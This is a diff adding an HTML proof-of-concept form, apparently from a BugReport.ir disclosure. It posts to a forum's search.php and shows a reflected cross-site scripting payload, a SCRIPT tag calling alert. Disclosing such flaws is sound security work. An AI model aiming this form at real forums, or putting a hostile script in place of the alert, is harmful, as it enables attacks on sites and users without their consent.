@@ -1,0 +1,7 @@
+<form action="http://[URL]/[Forum path]/search.php" method="post">
+<tr><td class=g>XSS: <small></td><tr>
+&quot;&lt;SCRIPT&gt;alert(/BugReport.ir-XSS/.source)&lt;/SCRIPT&gt;
+<br><tr><td class=g><INPUT TYPE="text" class="txt" NAME="search" SIZE="30" MAXLENGTH="100"><br/>
+<tr><td class=g><INPUT TYPE="RADIO" checked NAME="type" VALUE="themen">&nbsp;search only in topics</td></tr>
+<tr><td class=g><INPUT TYPE="RADIO" NAME="type" VALUE="beitraege">&nbsp;search in topics and answers</td></tr>
+<INPUT TYPE="SUBMIT" class="btn" NAME="submit" VALUE="submit"></td></tr>
